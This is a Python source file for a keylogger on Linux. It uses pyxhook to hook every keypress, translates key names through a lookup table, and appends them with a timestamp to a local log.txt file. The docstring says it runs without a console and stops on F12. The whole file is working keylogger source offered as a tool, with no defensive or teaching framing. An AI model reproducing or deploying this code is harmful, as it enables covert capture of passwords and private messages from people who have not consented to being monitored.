# -*- coding: UTF-8 -*-
"""Keylogger 

This script starts the keylogger without a console and allows you to record all keys
entered by the user in a log.

Requires `python-xlib` (pyxhook) installed inside the environment Python
on which you are running this script. This file too can be imported as a module
and contains the following functions:

    * main_kl - Main func, iniciate the keylogger.

Attributes
----------
file_path : str
    The path of log.txt .
dict_key : dict[str : str]
    Dict with values to be changed in event.Key
"""
import sys # sys.exit
from datetime import datetime
from pathlib import Path
from os import chdir, pardir
from os.path import dirname

from KLplus import pyxhook


file_path = dirname(__file__) + '/log.txt'

# Put current data on log
with open(file_path, 'a') as file:
    date = datetime.today().strftime('%d-%m-%Y--%H:%M:%S')
    file.write(f'\n{date}..:\n')

dict_key = {
        '[65105]':'´', 'space':' ', 'Escape':'[Esc]',
        'apostrophe':"'", 'Tab':'[Tab]', 'Caps_Lock': '[Caps_Lock]',
        'Super_L':'[WinKey_L]', 'backslash':'\\', 'Super_R':'[WinKey_R]',
        'slash':'/', 'semicolon':';', 'period':'.', 'comma':',',
        'ccedilla':'ç', 'bracketleft':'[', 'bracketright':']', '[65107]':'~',
        'BackSpace':'[BackSpace]', 'Return':'[Enter]', 'quotedbl':'"',
        'exclam':'!', 'at':'@', 'numbersign':'#', 'dollar':'$', 'percent':'%',
        '[65111]':'¨', 'ampersand':'&', 'asterisk':'*', 'parenleft':'(',
        'parenright':')', 'minus':'-', 'equal':'=', 'underscore':'_',
        'plus':'+', 'braceleft':'{', 'braceright':'}', 'greater':'>',
        'colon':':', 'question':'?', 'P_Subtract':'-', 'P_Add':'+',
        'P_multiply':'*', 'P_Divide':'/', 'P_Decimal':'.', 'P_Enter':'[Enter',
        'bar':'|', 'Up':'[Up]', 'Right':'[Right]', 'Left':'[Left]',
        'Down':'[Down]', 'F1':'[F1]', 'F2':'[F2]', 'F3':'[F3]', 'F4':'[F4]',
        'F5':'[F5]', 'F6':'[F6]', 'F7':'[F7]', 'F8':'[F8]', 'F9':'[F9]',
        'F10':'[F10]', 'F11':'[F11]', 'F12':'[F12]', 'Control_L':'[Ctrl_L]',
        'Control_R':'[Ctrl_R]', 'Shift_L':'[Shift_L]', 'Shift_R':'[Shift_R]',
        'Alt_L':'[Alt_L]', '[65027]':'[Alt_R]'
        }


def main_kl():
    """Main func, iniciate the keylogger.
    
    Functions:
        * write_event - Write at a log with the value of keyboard pressed.
    """

    def write_event(event):
        """Write at a log with the value of keyboard pressed (event.key)

        Parameters
        ----------
        event : class(pyxhook.pyxhookkeyevent)
            Class with info (str) of key pressed
        """

        # Change event.key by dict if...
        if event.Key in dict_key:
            event.Key = dict_key[event.Key]
    
        with open(file_path, 'a') as file:
            file.write(event.Key)

        # Exits if 'F12' is pressed
        if event.Key == '[F12]':
            hm.cancel
            sys.exit(0)

    hm = pyxhook.HookManager()
    hm.KeyDown = write_event  # Assign our func as callback event "press down"
    hm.start()  # Init threads process (hm heritage from threading by pyxhook)

    
if __name__ == "__main__":
    main_kl()